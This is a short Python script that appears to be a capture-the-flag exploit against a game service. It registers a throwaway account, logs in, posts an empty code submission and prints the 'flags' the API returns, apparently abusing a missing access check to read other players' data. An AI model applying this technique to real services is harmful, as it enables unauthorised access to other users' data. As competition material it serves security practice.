import sys
from checklib import get_initialized_session, rnd_username, rnd_password

ip = sys.argv[1]
PORT = 6091

url = f"http://{ip}:{PORT}/api"

s = get_initialized_session()
u, p = rnd_username(), rnd_password()

s.post(f"{url}/register/", json={
    'username': u,
    'password': p,
    'home': 'evilhacker',
})

s.post(f"{url}/login/", json={
    'username': u,
    'password': p,
})

cid = s.post(f"{url}/code/", json={
    'work': 'work',
    'code': []
}).json()['ok']

flags = s.get(f"{url}/code/{cid}/").json()['ok']

for i in flags:
    print(i, flush=True)
